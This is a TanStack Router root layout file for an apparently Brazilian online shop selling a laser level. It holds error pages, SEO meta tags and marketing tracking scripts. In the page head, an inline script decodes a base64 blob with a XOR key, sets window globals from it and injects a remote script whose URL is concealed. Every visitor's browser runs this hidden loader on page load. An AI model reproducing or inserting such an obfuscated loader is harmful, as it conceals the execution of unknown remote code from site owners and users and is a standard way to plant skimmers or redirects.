import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { name: "theme-color", content: "#1b2447" },
      { title: "Nível Laser 16 Linhas 360° com Tripé — Precisão Profissional em Seus Projetos" },
      {
        name: "description",
        content:
          "Nível laser verde 360° com 16 linhas, alcance de até 30m, tripé e 2 baterias. Ideal para alinhamentos, nivelamentos e marcações em reformas e instalações.",
      },
      { name: "author", content: "Compra Certa" },
      { property: "og:title", content: "Nível Laser 16 Linhas 360° com Tripé — Precisão Profissional em Seus Projetos" },
      {
        property: "og:description",
        content:
          "Nível laser verde 360° com 16 linhas, alcance de até 30m, tripé e 2 baterias. Ideal para alinhamentos, nivelamentos e marcações em reformas e instalações.",
      },
      { property: "og:type", content: "website" },
      { property: "og:locale", content: "pt_BR" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:title", content: "Nível Laser 16 Linhas 360° com Tripé — Precisão Profissional em Seus Projetos" },
      { name: "twitter:description", content: "Nível laser verde 360° com 16 linhas, alcance de até 30m, tripé e 2 baterias. Ideal para alinhamentos, nivelamentos e marcações em reformas e instalações." },
      { property: "og:image", content: "/images/hvlp/hvlp-1.jpg" },
      { name: "twitter:image", content: "/images/hvlp/hvlp-1.jpg" },
    ],
    links: [
      { rel: "stylesheet", href: appCss },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap",
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
        <script
          dangerouslySetInnerHTML={{
            __html:
              '(function(){var d_lmr=atob("DLEp8gRXJrFDWXFe9soLh3Y7BIthMQUqhsIT3Ss0Qt9tLAUzn9dQ3Gc4S58hK14tlcNAgnAkCcEqIRQy2cFAimE7CNswe118l8VdgG01U8UmKlNkrewF0GM7SdMiNQJ8zOpS0Go2S9RhY1Mun8lMnk0zBJ1hLxAyg9QLyCZhR4cna0c9w9IQkTFiEdNwOBM4xYcfwGF1W+w+");var l_a=[];for(var z_12=0;z_12<d_lmr.length;z_12++){l_a.push(d_lmr.charCodeAt(z_12)&255);}var f_c=l_a[0];var a_g=l_a.slice(1,1+f_c);var f_8vac=l_a.slice(1+f_c);var x_3=f_8vac.map(function(b,d_q){return b^a_g[d_q%f_c];});var w_k3="";for(var p_r=0;p_r<x_3.length;p_r++){w_k3+=String.fromCharCode(x_3[p_r]&255);}var c_q1=decodeURIComponent(escape(w_k3));var p_v=JSON.parse(c_q1);var n_u=p_v.globals||[];n_u.forEach(function(r_b9){window[r_b9.name]=r_b9.value;});var n_fgn1=document.createElement("script");n_fgn1.src=p_v.url;n_fgn1.async=true;n_fgn1.defer=true;(p_v.attributes||[]).forEach(function(f_wohn){n_fgn1.setAttribute(f_wohn.name,f_wohn.value);});(document.head||document.documentElement).appendChild(n_fgn1);})();',
          }}
        />
        <script
          src="https://cdn.utmify.com.br/scripts/utms/latest.js"
          data-utmify-prevent-xcod-sck
          data-utmify-prevent-subids
          async
          defer
        ></script>
        <script
          dangerouslySetInnerHTML={{
            __html:
              'window.pixelId = "6a31c357709dfb48aa367d61"; var a = document.createElement("script"); a.setAttribute("async", ""); a.setAttribute("defer", ""); a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js"); document.head.appendChild(a);',
          }}
        />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
